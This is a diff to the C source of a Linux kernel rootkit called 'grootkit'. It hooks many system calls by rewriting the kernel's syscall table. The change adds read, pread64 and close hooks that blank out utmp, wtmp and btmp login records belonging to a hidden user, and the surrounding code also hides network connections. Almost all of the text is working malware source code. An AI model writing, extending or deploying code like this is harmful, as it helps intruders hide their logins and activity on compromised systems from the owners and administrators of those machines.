@@ -114,8 +114,9 @@ char grootkit_filepath[NAME_MAX];
 char persistence_filepath[NAME_MAX];
 char malwares_filespaths[NAME_MAX][5];
 unsigned long int malware_directory_length;
-char *logged_filepath1 = "/var/run/utmp";
-char *logged_filepath2 = "/var/log/wtmp";
+char *logged_filespaths[3] = {"/var/run/utmp", "/var/log/wtmp", "/var/log/btmp"};
+unsigned long int smallest_pid;
+unsigned long int loggin_files_opened = 0;
 
 #define EMPTY           0
 #define RUN_LVL         1
@@ -139,11 +140,11 @@ struct opened_file {
 };
 
 struct opened_file opened_files[5] = {
-    {0, 0, 0},
-    {0, 0, 0},
-    {0, 0, 0},
-    {0, 0, 0},
-    {0, 0, 1}
+    {-1, -1, 0},
+    {-1, -1, 0},
+    {-1, -1, 0},
+    {-1, -1, 0},
+    {-1, -1, 1}
 };
 
 // https://elixir.bootlin.com/linux/v6.5.6/source/fs/internal.h#L168
@@ -231,10 +232,12 @@ typedef asmlinkage long (*openat_signature)(const struct pt_regs *);
 typedef asmlinkage long (*fstat_signature)(const struct pt_regs *);
 typedef asmlinkage long (*lstat_signature)(const struct pt_regs *);
 typedef asmlinkage long (*mkdir_signature)(const struct pt_regs *);
+typedef asmlinkage int (*close_signature)(const struct pt_regs *);
 typedef asmlinkage int (*statx_signature)(const struct pt_regs *);
 typedef asmlinkage long (*stat_signature)(const struct pt_regs *);
 typedef asmlinkage long (*open_signature)(const struct pt_regs *);
 typedef asmlinkage long (*kill_signature)(const struct pt_regs *);
+typedef asmlinkage int (*read_signature)(const struct pt_regs *);
 #else
 int dfd, const char __user *filename, unsigned flags, unsigned int mask, struct statx __user *buffer
 typedef asmlinkage int (*statx_signature)(int, const char __user *, unsigned, unsigned int, struct statx __user *);
@@ -251,7 +254,9 @@ typedef asmlinkage int (*fstat_signature)(const char *, struct stat *, int);
 typedef asmlinkage long (*newfstat_signature)(int, struct stat __user *);
 typedef asmlinkage long (*mkdir_signature)(const char __user *, umode_t);
 typedef asmlinkage int (*openat_signature)(int, const char *, int, int);
+typedef asmlinkage int (*read_signature)(unsigned long, char *, size_t);
 typedef asmlinkage int (*open_signature)(const char *, int, int);
+typedef asmlinkage long (*close_signature)(unsigned int);
 typedef asmlinkage long (*kill_signature)(pid_t, int);
 #endif
 
@@ -267,16 +272,18 @@ getdents_signature getdents_base;
 newlstat_signature newlstat_base;
 newfstat_signature newfstat_base;
 recvmsg_signature recvmsg_base;
-pread64_signature pread64_base;
 newstat_signature newstat_base;
+pread64_signature pread64_base;
 openat_signature openat_base;
 fstat_signature fstat_base;
 statx_signature statx_base;
 lstat_signature lstat_base;
 mkdir_signature mkdir_base;
+close_signature close_base;
 stat_signature stat_base;
 open_signature open_base;
 kill_signature kill_base;
+read_signature read_base;
 
 /*
     This function search a module by name.
@@ -682,11 +689,185 @@ void set_filedescriptor(int file_descriptor) {
 }
 
 /*
+    This function returns kernel symbol
+    (work with recent kernel versions).
+*/
+void *resolve_kernel_symbol(const char* symbol) {
+    #ifdef KPROBE_LOOKUP
+    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+    kallsyms_lookup_name_t kallsyms_lookup_name;
+    register_kprobe(&kp);
+    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
+    unregister_kprobe(&kp);
+#endif
+    return (void *)kallsyms_lookup_name(symbol);
+}
+
+/*
+    This function hooks syscalls.
+*/
+void *syscall_hooking(unsigned long new_function, unsigned int syscall_number) {
+    unsigned long *syscall_table = (unsigned long *)resolve_kernel_symbol("sys_call_table");
+    if (!syscall_table) {
+        printk(KERN_DEBUG "Error getting sys_call_table symbol\n");
+        return NULL;
+    }
+
+    void *base = (void *)syscall_table[syscall_number];
+
+    memprotect(0);
+    syscall_table[syscall_number] = (unsigned long)new_function;
+    memprotect(1);
+
+    return base;
+}
+
+/*
+    This function hooks sys_open syscall.
+*/
+#ifdef PTREGS_SYSCALL_STUBS
+asmlinkage int close_hook(const struct pt_regs *regs) {
+    unsigned int fd = regs->di;
+    int return_value = close_base(regs);
+#else
+asmlinkage int close_hook(unsigned int fd) {
+    int return_value = close_base(fd);
+#endif
+    if (return_value != 0 || fd <= 2 || current->pid <= smallest_pid) return return_value;
+    for (int index = 0; index < 5; index += 1) {
+        if (opened_files[index].pid == current->pid && opened_files[index].file_descriptor == fd) {
+            loggin_files_opened -= 1;
+            opened_files[index].pid = -1;
+            opened_files[index].file_descriptor = -1;
+
+            if (!loggin_files_opened) {
+                syscall_hooking((unsigned long)pread64_base, (unsigned int)__NR_pread64);
+                syscall_hooking((unsigned long)read_base, (unsigned int)__NR_read);
+                pread64_base = NULL;
+                read_base = NULL;
+            }
+        }
+    }
+    return return_value;
+}
+
+/*
+    This function returns 1 when the pread64 function
+    should be hooked for the file descriptor.
+*/
+int should_hide_content(unsigned long fd) {
+    for (int index = 0; index < 5; index += 1) {
+        if (opened_files[index].pid == current->pid && opened_files[index].file_descriptor == fd) return 1;
+    }
+    return 0;
+}
+
+/*
+    This function modify utmp record.
+*/
+void rewrite_utmp(char* buffer, struct utmp *utmp) {
+    if (strcmp(utmp->ut_user, hiddenuser) == 0) {
+        for (int index = 0; index < sizeof(struct utmp); index += 1) buffer[index] = 0;
+    }
+
+}
+
+/*
+    This function modify read functions behaviors.
+*/
+int new_read(unsigned long fd, char *buf, size_t count, int return_value) {
+    if (!should_hide_content(fd)) return return_value;
+
+    unsigned long buffer_position = 0;
+    char utmp_buffer[sizeof(struct utmp)];
+    struct utmp *utmp = (struct utmp *)utmp_buffer;
+
+    if (return_value == sizeof(struct utmp)) {
+        if (copy_from_user(utmp, buf, sizeof(struct utmp))) return return_value;
+        rewrite_utmp(utmp_buffer, utmp);
+        copy_to_user(buf, utmp, sizeof(struct utmp));
+    } else {
+        struct file *file = fget(fd);
+        if (file == NULL) return return_value;
+
+        loff_t position = file->f_pos;
+        loff_t read_position = position - return_value;
+        loff_t start = (read_position / sizeof(struct utmp)) * sizeof(struct utmp);
+        unsigned long int start_offset = read_position - start;
+        unsigned long int end_offset = (start + start_offset + return_value) % sizeof(struct utmp);
+        unsigned long int length = start_offset + return_value;
+        if (end_offset) length += sizeof(struct utmp) - end_offset;
+        unsigned long int end = start + length;
+
+        char *kernel_buffer = kzalloc(length, GFP_KERNEL);
+        if (kernel_buffer == NULL) {
+            fput(file);
+            return return_value;
+        }
+
+        char *temp_buffer = kernel_buffer;
+        int real_length = kernel_read(file, kernel_buffer, length, &start);
+
+        while (real_length >= sizeof(struct utmp)) {
+            utmp = (struct utmp *)temp_buffer;
+            rewrite_utmp(temp_buffer, utmp);
+            temp_buffer += sizeof(struct utmp);
+            real_length -= sizeof(struct utmp);
+        }
+        printk(KERN_CRIT "Not checked: %i\n", real_length);
+
+        copy_to_user(buf, kernel_buffer + start_offset, return_value);
+        file->f_pos = position;
+        kfree(kernel_buffer);
+        fput(file);
+    }
+
+    return return_value;
+}
+
+/*
+    This function hooks sys_read syscall.
+*/
+#ifdef PTREGS_SYSCALL_STUBS
+asmlinkage int read_hook(const struct pt_regs *regs) {
+    unsigned int fd = regs->di;
+    char *buf = (char *)regs->si;
+    size_t count = regs->dx;
+    int return_value = read_base(regs);
+#else
+asmlinkage int read_hook(unsigned int fd, char *buf, size_t count) {
+    int return_value = read_base(fd, buf, count);
+#endif
+    if (return_value <= 0 || current->pid <= smallest_pid) return return_value;
+    return new_read(fd, buf, count, return_value);
+}
+
+/*
+    This function hooks sys_pread64 syscall.
+*/
+#ifdef PTREGS_SYSCALL_STUBS
+asmlinkage int pread64_hook(const struct pt_regs *regs) {
+    unsigned long fd = regs->di;
+    char *buf = (char *)regs->si;
+    size_t count = regs->dx;
+    int return_value = pread64_base(regs);
+#else
+asmlinkage int pread64_hook(unsigned long fd, char *buf, size_t count, loff_t pos) {
+    int return_value = pread64_base(fd, buf, count, pos);
+#endif
+    if (return_value <= 0 || current->pid <= smallest_pid) return return_value;
+    return new_read(fd, buf, count, return_value);
+}
+
+/*
     This function define the new behavior for sys_openat syscall.
 */
 long new_openat(const char *filename, long return_value, int is_file_descriptor) {
-    if (strcmp(logged_filepath1, filename) == 0 || strcmp(logged_filepath2, filename) == 0) {
+    if (is_file_descriptor && current->pid > smallest_pid && (strcmp(logged_filespaths[0], filename) == 0 || strcmp(logged_filespaths[1], filename) == 0 || strcmp(logged_filespaths[2], filename) == 0)) {
+        if (read_base == NULL) read_base = syscall_hooking((unsigned long)read_hook, (unsigned int)__NR_read);
+        if (pread64_base == NULL) pread64_base = syscall_hooking((unsigned long)pread64_hook, (unsigned int)__NR_pread64);;
         set_filedescriptor(return_value);
+        loggin_files_opened += 1;
         return return_value;
     }
 
@@ -896,48 +1077,6 @@ asmlinkage int newstat_hook(const char __user *filename, struct stat __user *sta
 }
 
 /*
-    This function returns 1 when the pread64 function
-    should be hooked for the file descriptor.
-*/
-int should_hide_content(unsigned long fd) {
-    for (int index = 0; index < 5; index += 1) {
-        if (opened_files[index].pid == current->pid && opened_files[index].file_descriptor == fd) return 1;
-    }
-    return 0;
-}
-
-/*
-    This function hooks sys_pread64 syscall.
-*/
-#ifdef PTREGS_SYSCALL_STUBS
-asmlinkage int pread64_hook(const struct pt_regs *regs) {
-    int fd = regs->di;
-    char *buf = (char *)regs->si;
-    size_t count = regs->dx;
-    int return_value = pread64_base(regs);
-#else
-asmlinkage int pread64_hook(unsigned long fd, char *buf, size_t count, loff_t pos) {
-    int return_value = pread64_base(fd, buf, count, pos);
-#endif
-    if (!should_hide_content(fd)) return return_value;
-
-    char *kernel_buffer = kzalloc(count, GFP_KERNEL);
-    if (kernel_buffer == NULL) return return_value;
-
-    if (copy_from_user(kernel_buffer, buf, count)) goto end;
-    struct utmp *utmp = (struct utmp *)kernel_buffer;
-
-    if (strcmp(utmp->ut_user, hiddenuser) == 0) {
-        for (int index = 0; index < count; index += 1) kernel_buffer[index] = 0;
-        copy_to_user(buf, kernel_buffer, count);
-    }
-
-end:
-    kfree(kernel_buffer);
-    return return_value;
-}
-
-/*
     This function hide TCP connection with
     specific port or IPv4 address.
 */
@@ -1019,40 +1158,6 @@ asmlinkage long udp6_seq_show_hook(struct seq_file *seq, void *s) {
 }
 
 /*
-    This function returns kernel symbol
-    (work with recent kernel versions).
-*/
-void *resolve_kernel_symbol(const char* symbol) {
-    #ifdef KPROBE_LOOKUP
-    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
-    kallsyms_lookup_name_t kallsyms_lookup_name;
-    register_kprobe(&kp);
-    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
-    unregister_kprobe(&kp);
-#endif
-    return (void *)kallsyms_lookup_name(symbol);
-}
-
-/*
-    This function hooks syscalls.
-*/
-void *syscall_hooking(unsigned long new_function, unsigned int syscall_number) {
-    unsigned long *syscall_table = (unsigned long *)resolve_kernel_symbol("sys_call_table");
-    if (!syscall_table) {
-        printk(KERN_DEBUG "Error getting sys_call_table symbol\n");
-        return NULL;
-    }
-
-    void *base = (void *)syscall_table[syscall_number];
-
-    memprotect(0);
-    syscall_table[syscall_number] = (unsigned long)new_function;
-    memprotect(1);
-
-    return base;
-}
-
-/*
     Define hook structure for xxpX_seq_show symbols.
 */
 struct ftrace_hook tcp4_seq_show_struct = {"tcp4_seq_show", tcp4_seq_show_hook, &tcp4_seq_show_base, 0, {}};
@@ -1124,6 +1229,7 @@ void get_full_path(char* full_file_path, char* directory, char* filename) {
     This function is launched on module load.
 */
 static int __init grootkit_init(void) {
+    smallest_pid = current->pid;
     // protect_and_hide();
     getdents64_base = syscall_hooking((unsigned long)getdents64_hook, (unsigned int)__NR_getdents64);
     newfstatat_base = syscall_hooking((unsigned long)newfstatat_hook, (unsigned int)__NR_newfstatat);
@@ -1131,16 +1237,18 @@ static int __init grootkit_init(void) {
     // newfstat_base = syscall_hooking((unsigned long)newfstat_hook, (unsigned int)__NR_newfstat);
     // newlstat_base = syscall_hooking((unsigned long)newlstat_hook, (unsigned int)__NR_newlstat);
     recvmsg_base = syscall_hooking((unsigned long)recvmsg_hook, (unsigned int)__NR_recvmsg);
-    pread64_base = syscall_hooking((unsigned long)pread64_hook, (unsigned int)__NR_pread64);
+    // pread64_base = syscall_hooking((unsigned long)pread64_hook, (unsigned int)__NR_pread64);
     // newstat_base = syscall_hooking((unsigned long)newstat_hook, (unsigned int)__NR_newstat);
     openat_base = syscall_hooking((unsigned long)openat_hook, (unsigned int)__NR_openat);
     mkdir_base = syscall_hooking((unsigned long)mkdir_hook, (unsigned int)__NR_mkdir);
     fstat_base = syscall_hooking((unsigned long)fstat_hook, (unsigned int)__NR_fstat);
     lstat_base = syscall_hooking((unsigned long)lstat_hook, (unsigned int)__NR_lstat);
     statx_base = syscall_hooking((unsigned long)statx_hook, (unsigned int)__NR_statx);
+    close_base = syscall_hooking((unsigned long)close_hook, (unsigned int)__NR_close);
     stat_base = syscall_hooking((unsigned long)stat_hook, (unsigned int)__NR_stat);
     kill_base = syscall_hooking((unsigned long)kill_hook, (unsigned int)__NR_kill);
     open_base = syscall_hooking((unsigned long)open_hook, (unsigned int)__NR_open);
+    // read_base = syscall_hooking((unsigned long)read_hook, (unsigned int)__NR_read);
 
     tcp4_seq_show_base = symbol_hooking(&tcp4_seq_show_struct);
     tcp6_seq_show_base = symbol_hooking(&tcp6_seq_show_struct);
@@ -1168,13 +1276,13 @@ static void __exit grootkit_exit(void) {
     // syscall_hooking((unsigned long)newfstat_base, (unsigned int)__NR_newfstat);
     // syscall_hooking((unsigned long)newlstat_base, (unsigned int)__NR_newlstat);
     syscall_hooking((unsigned long)recvmsg_base, (unsigned int)__NR_recvmsg);
-    syscall_hooking((unsigned long)pread64_base, (unsigned int)__NR_pread64);
     // syscall_hooking((unsigned long)newstat_base, (unsigned int)__NR_newstat);
     syscall_hooking((unsigned long)openat_base, (unsigned int)__NR_openat);
     syscall_hooking((unsigned long)mkdir_base, (unsigned int)__NR_mkdir);
     syscall_hooking((unsigned long)fstat_base, (unsigned int)__NR_fstat);
     syscall_hooking((unsigned long)lstat_base, (unsigned int)__NR_lstat);
     syscall_hooking((unsigned long)statx_base, (unsigned int)__NR_statx);
+    syscall_hooking((unsigned long)close_base, (unsigned int)__NR_close);
     syscall_hooking((unsigned long)stat_base, (unsigned int)__NR_stat);
     syscall_hooking((unsigned long)open_base, (unsigned int)__NR_open);
     syscall_hooking((unsigned long)kill_base, (unsigned int)__NR_kill);
@@ -1183,6 +1291,9 @@ static void __exit grootkit_exit(void) {
     symbol_unhooking(&tcp6_seq_show_struct);
     symbol_unhooking(&udp6_seq_show_struct);
     symbol_unhooking(&udp4_seq_show_struct);
+
+    if (pread64_base != NULL) syscall_hooking((unsigned long)pread64_base, (unsigned int)__NR_pread64);
+    if (read_base != NULL) syscall_hooking((unsigned long)read_base, (unsigned int)__NR_read);
 }
 
 module_init(grootkit_init);
